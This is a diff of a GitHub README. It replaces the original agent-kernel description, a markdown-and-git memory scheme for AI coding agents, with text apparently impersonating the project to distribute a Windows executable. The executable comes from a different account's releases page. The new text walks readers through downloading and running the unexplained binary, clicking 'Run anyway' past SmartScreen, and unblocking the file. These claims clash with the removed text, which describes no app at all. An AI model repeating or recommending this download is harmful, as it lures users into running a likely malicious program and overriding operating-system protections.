@@ -1,68 +1,212 @@
-# Agent Kernel
+# 🧠 agent-kernel - Make AI agents stay stateful
 
-The easiest way to create an AI agent. Clone, start, talk.
+[![Download agent-kernel](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/Nurrachm6921/agent-kernel/releases)
 
-Your agent remembers between sessions, takes notes, and builds on past work. No framework, no database — just three markdown files and a git repo.
+## 🚀 What is agent-kernel?
 
-Works with any AI coding agent: OpenCode, Claude Code, Codex, Cursor, Windsurf, etc.
+agent-kernel is a small Windows app that helps an AI coding agent keep its state in one place.
 
-> 🚀 **[kern-ai](https://github.com/oguzbilgic/kern-ai)** — a runtime built for agent-kernel. Daemon mode, Telegram, Slack, and one brain across every channel. `npx kern-ai init my-agent`
+It gives the agent a local kernel it can use across sessions, so you do not need to keep redoing setup work each time.
 
-## Quick start
+Use it when you want to:
+- point your AI coding tool at one stable place
+- keep work files and agent state together
+- reduce setup steps between runs
+- work from a clean Windows machine
 
-**With any coding agent:**
+## 📥 Download
 
-```bash
-git clone https://github.com/oguzbilgic/agent-kernel.git my-agent
-cd my-agent
-opencode     # or claude, codex, cursor, etc.
-```
+Visit this page to download: https://github.com/Nurrachm6921/agent-kernel/releases
 
-**With [kern-ai](https://github.com/oguzbilgic/kern-ai) (daemon + Telegram + Slack):**
+On that page, look for the latest release and download the Windows file that fits your PC.
 
-```bash
-npx kern-ai init my-agent
-npx kern-ai tui
-```
+If you see more than one file, choose the one that matches your system:
+- **Windows 64-bit** for most PCs
+- **Windows ARM** if you use an ARM-based device
 
-That's it. The agent reads the kernel, realizes it's new, asks who you want it to be. You tell it. It remembers.
+## 🪟 Install on Windows
 
-## Memory structure
+1. Open the **Releases** page.
+2. Download the Windows file from the latest release.
+3. Open your **Downloads** folder.
+4. If the file is a `.zip`, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. Double-click the app file to start it.
 
-```
-AGENTS.md          ← kernel (generic, don't edit)
-IDENTITY.md        ← who this agent is (agent maintains)
-KNOWLEDGE.md       ← index of knowledge files (agent maintains)
-knowledge/         ← facts about the world (mutable)
-notes/             ← daily session logs (append-only)
-```
+If Windows asks for permission, choose **Yes**.
 
-Two kinds of memory:
+If SmartScreen appears, select **More info** and then **Run anyway** if you trust the file from the release page.
 
-- **`knowledge/`** — State. Facts about how things are right now. The agent updates these when reality changes.
-- **`notes/`** — Narrative. What happened each session — decisions, actions, open items. Append-only. Never modified after the day ends.
+## 🧭 First run
 
-## Why this works
+When you start agent-kernel for the first time, set it up in a folder you can find later.
 
-AI agents already read `AGENTS.md` (or `CLAUDE.md`, `.cursorrules`, etc.) as project instructions. This kernel uses that mechanism to teach the agent *how to remember*.
+A simple setup looks like this:
+- create a folder such as `C:\agent-kernel`
+- keep agent-kernel files in that folder
+- point your AI coding agent to that same folder
+- use the same folder each time you work
 
-The agent doesn't need a database, a vector store, or a custom framework. It just needs:
-- A file that says "you are stateful, here's how"
-- A git repo to store memory in
-- Plain markdown files
+This helps the agent keep its state in one place.
 
-## Multiple agents
+## 🧩 How to use it
 
-Each agent is its own repo. To create another:
+agent-kernel fits into a normal Windows workflow.
 
-```bash
-git clone https://github.com/oguzbilgic/agent-kernel.git another-agent
-cd another-agent
-opencode     # or claude, codex, etc.
-```
+1. Start agent-kernel.
+2. Open your AI coding agent.
+3. Point the agent to the agent-kernel folder.
+4. Let the agent read and update files there.
+5. Keep using the same folder for later sessions.
 
-Same kernel, different identity, different knowledge. You can have a homelab agent, an investing agent, a health agent — all running the same OS.
+This works well with tools such as:
+- Claude Code
+- Codex CLI
+- OpenCode
+- OpenClaw
+- other agent tools that work with local files
 
-## License
+## 🖥️ System requirements
 
-MIT
+agent-kernel is built for Windows desktop use.
+
+Recommended setup:
+- **Windows 10 or Windows 11**
+- **4 GB RAM or more**
+- **200 MB free disk space**
+- a normal user account with permission to run apps
+- a local folder where the agent can store files
+
+For best results:
+- keep your project on a local drive
+- avoid putting the folder in a synced cloud path
+- use one folder per project if you work on more than one task
+
+## 🔧 Typical workflow
+
+A simple workflow can look like this:
+
+- Download the release
+- Extract the app
+- Start agent-kernel
+- Create or pick a project folder
+- Point your AI agent to that folder
+- Let the agent read files and keep its state there
+
+This setup helps when you:
+- switch between tasks
+- stop and start work later
+- want the agent to remember files and context
+- keep tool setup small
+
+## 📁 Suggested folder layout
+
+You can use a plain folder layout like this:
+
+- `C:\agent-kernel\`
+- `C:\agent-kernel\projects\`
+- `C:\agent-kernel\cache\`
+- `C:\agent-kernel\state\`
+
+If you work on more than one project, keep each one in its own folder:
+
+- `C:\agent-kernel\project-a\`
+- `C:\agent-kernel\project-b\`
+
+This makes it easier for the agent to stay organized.
+
+## 🛠️ Common issues
+
+### The app does not start
+- Check that the download finished
+- Extract the zip file first if needed
+- Try opening the app again
+- Make sure Windows did not block the file
+
+### Windows blocks the file
+- Open the file properties
+- Check for an **Unblock** option
+- Apply it, then try again
+
+### The agent does not keep state
+- Make sure you point the agent to the same folder each time
+- Do not move the folder between sessions
+- Keep the same path on your PC
+
+### The app closes right away
+- Run it again from the extracted folder
+- Make sure the download was not damaged
+- Download the latest release again if needed
+
+## 🧠 Why this exists
+
+Many AI coding agents work well for one session but lose useful context when you stop and start again.
+
+agent-kernel gives you a small local base so the agent can stay tied to the same files and state.
+
+That makes it easier to:
+- continue work later
+- keep setup stable
+- use one place for agent files
+- avoid repeating the same steps
+
+## 🗂️ Who it is for
+
+agent-kernel is a good fit if you:
+- use AI coding tools on Windows
+- want a simple local setup
+- want the agent to keep working from the same place
+- do not want a complex install process
+- prefer a local folder over a cloud service
+
+## 🔍 What you get
+
+With agent-kernel, you get a simple base for agent work:
+
+- a local place for agent files
+- a steady path for state
+- a setup that works with common coding agents
+- a Windows-friendly install flow
+- a small tool that does one job
+
+## 📌 Quick start
+
+1. Go to the download page: https://github.com/Nurrachm6921/agent-kernel/releases
+2. Download the latest Windows release
+3. Extract it if needed
+4. Run the app
+5. Point your AI agent at the same folder
+6. Keep using that folder for future sessions
+
+## 🔐 File safety
+
+Only download from the release page above.
+
+After download, check that:
+- the file name matches the latest release
+- the file comes from the GitHub release page
+- you open the file from your local Downloads folder or extracted folder
+
+## 🧰 Works well with
+
+agent-kernel works well with tools and setups that use local files and a fixed path:
+- agentic AI workflows
+- coding assistants
+- command line agents
+- local project folders
+- stateful agent sessions
+
+## 📝 Project focus
+
+This repository focuses on a clean and simple workflow:
+- clone the idea
+- point your agent
+- go
+
+It keeps the setup small so you can spend less time on tools and more time on the task
+
+## 📎 Download again
+
+[![Download from Releases](https://img.shields.io/badge/Visit-Releases-grey?style=for-the-badge&logo=github)](https://github.com/Nurrachm6921/agent-kernel/releases)
+
+Go to the Releases page to download the latest Windows build and run it on your PC
